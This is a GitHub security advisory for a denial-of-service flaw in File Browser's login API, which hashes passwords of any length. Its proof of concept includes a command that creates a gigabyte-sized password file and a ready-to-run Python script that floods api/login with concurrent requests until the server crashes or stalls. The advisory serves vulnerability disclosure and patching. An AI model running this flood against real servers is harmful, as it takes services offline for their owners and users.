# [H] File Browser has a DoS Vulnerability via Public Login API

## Summary
Severity: High
Advisory: GHSA-w5fm-68j4-fpc4
CVE: CVE-2026-54092
CWE: CWE-1284, CWE-400
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-06-12
Source: https://github.com/advisories/GHSA-w5fm-68j4-fpc4
Type: github-advisory

## Affected
- Go: `github.com/filebrowser/filebrowser/v2` — affected >=0 <2.63.6
- Go: `github.com/filebrowser/filebrowser` — affected >=0

## Details
### Summary
Unchecked passwords maximums allow for an arbitrarily large password to be passed into the login API. This spikes CPU and memory, and after testing, crashes, heavily lags any container created, and has even made my docker daemon start to send errors with status code 500 even after the container was destroyed.

### Details
When sending JSON in the body of the request to the route `api/login`, if a large password is sent, there is no checking on a maximum length password. This means that any length string can be sent to the server and it will be hashed. Specifically the function `CheckPwd` in `users/password.go` is called to hash and check to see if the user supplied password is valid, but there is no maximum length for the password checked in that function. Depending on how many concurrent requests are being made, there may be no logs about the failed login attempts.

### PoC
Create a file with a large password using this command:
```bash
yes "thisisalongphraseithinksoyeahitisactuallyimsureitiswhatisthisisamouthwoahimcoolwheredidthiscomefromwowza" | head -n 10000000 > large-password.txt
```
This makes a file that's about a gigabyte. The `n` parameter in the head function can be adjusted to increase or decrease the file size. Afterwards, run the following script to make a filebrowser container:
```bash
docker run -v filebrowser_data:/srv -v filebrowser_database:/database -v filebrowser_config:/config -p 8080:80 filebrowser/filebrowser
```

After running the container, it is recommended to bring up some sort of performance dashboard on the container that is running to monitor CPU and memory usage. Afterwards, run the following Python script (make sure to install dependencies: `pip install aiohttp asyncio `). The `CONCURRENT_REQUESTS` parameter controls the number of requests to be making at one time. The `TOTAL_REQUESTS` parameter controls the grand total number of requests sent to the targeted container. If one wants more severe results, turn it up. If one wants less severe results, turn it down. The setting it's on right now is where I've found it can either crash the targeted container or just make it lag until it doesn't respond but is still on.

```python
import aiohttp
import asyncio
from time import perf_counter

url = 'http://localhost:8080/api/login'
CONCURRENT_REQUESTS = 30
TOTAL_REQUESTS = 1000
async def make_request(session, body, semaphore):
    async with semaphore:
        try:
            async with session.post(url, json=body) as response:
                print(response.status)
        except asyncio.TimeoutError:
            print('Request timed out')
        except aiohttp.ConnectionTimeoutError:
            print('Request timed out')
        except Exception as e:
            print(f"Unexpected error {e}")

async def main():
    with open("./large-password.txt", "r") as f:
        file_contents = f.read()

    body = {
        "username": "admin",
        "password": file_contents,
        "recaptcha": ""
    }

    headers = {"Content-Type": "application/json"}
    semaphore = asyncio.Semaphore(CONCURRENT_REQUESTS)

    async with aiohttp.ClientSession(headers=headers) as session:
        tasks = [
            make_request(session, body, semaphore)
            for _ in range(TOTAL_REQUESTS)  
        ]

        start = perf_counter()
        await asyncio.gather(*tasks)
        end = perf_counter()

        print(f"Completed {len(tasks)} requests in {end - start:.2f} seconds")

if __name__ == "__main__":
    asyncio.run(main())
```

### Impact
The vulnerability impacts anyone who uses this service.

## References
- https://github.com/filebrowser/filebrowser/security/advisories/GHSA-w5fm-68j4-fpc4
- https://nvd.nist.gov/vuln/detail/CVE-2026-54092
- https://github.com/filebrowser/filebrowser/commit/847d08bdd135e5c3659f2e6dea2f0cd36617af9b
- https://github.com/filebrowser/filebrowser
- https://github.com/filebrowser/filebrowser/releases/tag/v2.63.6
- https://vincent.vulcoord.net/score/?state=Not+Scored&year=2026&year=2025&assigned_to=a165dae3-480e-4f7d-bbb8-9b1d78115b69&cve=CVE-2026-54092&analyze=1
